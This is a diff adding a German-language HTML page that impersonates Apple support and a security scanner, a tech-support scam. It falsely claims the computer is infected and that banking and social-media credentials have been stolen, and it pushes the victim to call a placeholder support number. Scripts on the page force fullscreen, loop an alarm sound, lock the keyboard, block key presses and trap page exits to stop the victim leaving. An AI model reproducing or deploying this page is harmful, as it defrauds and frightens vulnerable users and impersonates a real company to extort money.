@@ -1,0 +1,393 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Apple-Support-Unterstützung</title>
+<link rel="stylesheet" href="styles.css">
+<script type="text/javascript" src="scripts.js"></script>
+<script type="text/javascript" src="custom.js"></script>
+<link rel="icon" type="image/png" href="apple.png">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxx-x"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxx-x');
+</script>
+
+<style>
+  .black {
+    width: 100%;
+    height: 100%;
+    background-color: rgb(0 0 0 / 47%);
+    opacity: 0.7;
+    transition: 1s;
+    position: absolute;
+    top: -190px;
+    left:0
+  }
+  </style>
+
+
+
+  <script>
+  var elem = document.documentElement;
+  function openFullscreen() {
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) { /* Safari */
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) { /* IE11 */
+      elem.msRequestFullscreen();
+    }
+  }
+
+  function closeFullscreen() {
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
+    } else if (document.webkitExitFullscreen) { /* Safari */
+      document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) { /* IE11 */
+      document.msExitFullscreen();
+    }
+  }
+  </script>
+
+<script type="text/javascript">
+window.onbeforeunload = function() {
+   if (data_needs_saving()) {
+       return "Rufen Sie jetzt die Windows Defender-Hilfeleitung an";
+   } else {
+      return;
+   }
+};
+        </script>
+        <script type="text/javascript">
+            window.addEventListener("beforeunload", function (e) {
+         var confirmationMessage = 'It looks like you are editing something.'
+                            + 'Your changes will be lost if you leave before saving.';
+
+                (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+            });
+        </script>
+
+</head>
+<body id="mycanvas" onclick="playSound()" >
+
+  <div class="bg" style="cursor:none;">
+    <div class="bgimg" style="top: 0px;"><img src="bg.png" alt="" width="100%"/></div>
+
+</div>
+  <a  onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+    <div class="black" style="height: 145%;"></div>
+</a>
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple-Sicherheit<img src="minimize.jpeg" class="" style="float: right; width:115px;"></p>
+</div>
+
+<h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">Sicherheit auf einen Blick</h4>
+<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Überprüfen Sie, was mit der Sicherheit und Gesundheit Ihres Geräts passiert, und ergreifen Sie alle erforderlichen Maßnahmen.</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="kxFy-clip.png" width="50px;">
+<p>Apple-Sicherheitsschutz</p>
+<p style="top: 103px; position: absolute; font-size: 13px; color: grey;">maßnahmen sind erforderlich. Führen Sie einen Scan durch, um nach <br> Bedrohungen zu suchen.</p>
+
+</li>
+<li>
+<br><br>
+<img src="qsbs-firewall.png" width="60px;">
+<p>Firewall und Netzwerkschutz</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">Keine Aktion erforderlich.</p>
+</li>
+</ul>
+<ul>
+<li>
+<br>
+<img src="s-S4-acc.png" width="60px;">
+<p>Kontoschutz</p>
+<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">Keine Aktion erforderlich.</p>
+</li>
+<li>
+<br>
+<img src="Z5BR-network.png" width="51px;"/>
+<p>Anwendungs- und Browsersteuerung</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">Keine Aktion erforderlich.</p>
+</li>
+</ul>
+</div>
+<img src="uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<br>
+</div>
+
+
+<!--Apple-Sicherheit Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple-Sicherheit<img src="minimize.jpeg" class="" style="float: right; width:115px;"></p>
+  </div>
+  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="apple.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Apple-Sicherheit Protection</h4>
+  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Geräteschutz vor Bedrohungen.</p>
+
+<h3 style="    position: absolute;
+right: 150px;
+top: 6px;
+font-weight: 500;
+font-size: 19px;" id="text12"><b>01 01 01 01 01  (kostenlose Sicherheit)</b></h3>
+
+  <div class="centerright">
+
+
+  <ul>
+  <li>
+
+
+
+  <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">aktuelle Bedrohung</p></div>
+
+
+  <br><br>
+  <div class="progress" id="bar">
+    <div class="progress__bar"></div>
+  </div>
+
+  <p style="font-size: 13px;" id="info">Schneller Scan läuft...<br>Geschätzte verbleibende Zeit: <n id="time">0</b></n><br><n id="amount">0</b>< /n> Gescannte Dateien.</p>
+
+  <a href="#"class="button" id="re">Stornieren</a>
+  <p style=" font-size: 13px;" id="recx">Arbeiten Sie weiter, während wir Ihr Gerät analysieren.</p>
+
+  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">schutzgeschichte</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan-Optionen<br> Zulässige Bedrohungen<br> schutzgeschichte</p>
+
+
+  </li>
+
+  <li>
+
+<div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px;"><p style="position: absolute; left: 35px;    bottom: 117px;    line-height: 18px;">Einstellungen für Viren- und <br>Bedrohungsschutz</p> </div>
+<p style="color: grey; font-size: 13px;">keine Aktion erforderlich</p>
+<p style="font-size: 13px; color: #0063c6;">Verwalten Sie Ihre Einstellungen</p>
+  </li>
+  </ul>
+  <ul>
+
+  <li>
+
+
+  <p style="position: absolute; top: -55px;">Ich habe eine Frage?</p>
+
+  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">holen Sie sich Hilfe</p>
+
+  </li>
+  <li>
+
+
+    <p style="position: absolute; top: 25px;">wer wird mich beschützen?</p>
+
+    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Lieferantenmanagement</p>
+
+    </li>
+    <li>
+
+
+      <p style="position: absolute; top: 100px; "><br>Hilf uns, die Apple-Sicherheit zu verbessern</p>
+
+      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Senden Sie uns Ihr Feedback</p>
+
+      </li>
+      <li>
+
+        <p style="position: absolute; top: 190px;">Ändern Sie Ihre Datenschutzeinstellungen</p>
+        <p style="position: absolute; top: 220px; font-size: 13px;">Anzeigen und Ändern der Datenschutzeinstellungen auf dem Mac<br><n id="which"></b></n> Speichergeräte.</p>
+
+        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 300px; cursor: pointer;">Datenschutzeinstellungen<br>Datenschutz-Dashboard<br>Datenschutzerklärung</p>
+
+        </li>
+
+  </ul>
+
+  </div>
+  <img src="uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Apple") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Jenseits");
+        }
+     }
+     else {
+       console.log("funktioniert nicht auf dem Mac");
+     }
+   });
+  </script>
+
+
+
+
+
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #fff;font-weight: bold;
+margin-top: 8px; text-align: center;">Apple-Sicherheits - Schutzwarnung</p>
+                <p class="text-center" style="text-transform: uppercase;margin-bottom: 0;font-weight: 600;">** Der Zugriff auf diesen PC wurde aus Sicherheitsgründen gesperrt **</p>
+                <p>Ihr Computer wurde gewarnt, dass er mit unbekanntem Fehlercode infiziert ist: # 0x6D9. Die folgenden Daten wurden kompromittiert:<br><br>
+                  > E-Mail-ADRESSE<br> &gt; Bankpasswort<br>
+                  > Facebook-Anmeldung<br>
+                  > Fotos und Fotodokumente </p>
+
+                  <p>Ein Apple-Sicherheitsscan hat potenziell unerwünschte Adware auf diesem Gerät erkannt, die Ihre Passwörter, Online-Identitäten, Finanzinformationen, persönlichen Dateien, Bilder oder Dokumente stehlen kann. </p>
+                  <!-- <p>Please contact us immediately so that our engineers can explain the removal process over the phone. <br><br> -->
+
+                   <p> Bitte wenden Sie sich umgehend an den Apple Unterstützung, um diese Bedrohung zu melden, Spoofing zu verhindern und den Zugriff auf dieses Gerät freizuschalten. <br><br>
+                    Das Schließen dieses Mac gefährdet Ihre persönlichen Daten und unterbricht Ihre Mac-Registrierung.</p>
+
+               <p style="padding-bottom: 0px;">Rufen Sie den Apple Unterstützung an <strong>01 01 01 01 01  (Sicherheitsunterstützung)</strong></p>
+               <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">Habe verstanden</a> <a class="" id="leave_page">Stornieren</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop>
+  <source src="_Fm7-alert.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<div id="lst" class="lst lightbox">
+  <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="apple.png" class="logo3"></span> Apple Defender Sicherheitscenter</span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
+
+      </div>
+  </div>
+  <div id="txtintro">
+              <span class="colo-rd">App: Anzeigen.Finanzspur (x07).dll<br>
+                Erkannte Bedrohungen:Stuxnet. Unbekannter Fehlercode: # 0x6D09</span>
+  </div>
+  <img id="banner" src="virus-images.png">
+  <div id="disclaimer">
+    Der Zugriff auf diesen PC wurde aus Sicherheitsgründen gesperrt.<br>
+      <span class="support">Wenden Sie sich an den Apple Unterstützung:<br> 01 01 01 01 01 (Sicherheitsunterstützung)</span>
+  </div>
+  <div id="bottom">
+      <img id="badge" src="apple.png"><span class="title3">Apple Unterstützung</span>
+      <ul>
+          <li>
+              <a href="#">
+                  <div class="fr button2">
+                      <span id="addtochromebutton">Leugnen</span>
+                  </div>
+              </a>
+          </li>
+          <li>
+              <a href="#">
+                  <div class="fr buttons blink">
+                      <span id="addtochromebutton">Erlauben</span>
+                  </div>
+              </a>
+          </li>
+      </ul>
+
+  </div>
+</div>
+
+</div>
+
+<div id="footer" style="bottom: 0; position: absolute; cursor: none;width: auto;overflow: hidden;">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt" style="font-weight: 700;"><img src="apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support-Kontakt <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">01 01 01 01 01  (Sicherheitsunterstützung)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Apfel
+            Defender SmartScreen verhinderte die Anzeige nicht erkannter Apps. Das Ausführen dieser App kann Ihren PC in Mitleidenschaft ziehen
+            gefährden. Apple Defender Scan hat unerwünschte Adware gefunden, die auf diesem Gerät gestohlen werden kann
+            passwörter, Online-IDs, Finanzinformationen, persönliche Dateien, Fotos oder
+            Dokument.</small></marquee>
+      </div>
+  </div>
+
+
+</div>
+
+<div id="welcomeDiv"
+     style=" display:none; background-color:#000; height: auto; width: 550px;left:32%;position: absolute;z-index: 9999999999;text-align: center;top: 0; "
+     class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Nicht neu starten oder verwenden
+      Ihren Computer.<br>Ihr Computer ist deaktiviert. Bitte rufen Sie Apple Unterstützung an. <br>Der Zugriff ist der Grund für die Blocksicherheit
+      Computer. <br> Bitte kontaktieren Sie uns sofort. Ein Techniker hilft Ihnen bei der Lösung des Problems.</p>
+
+
+</div>
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+
+ </body>
+
+
+</html>
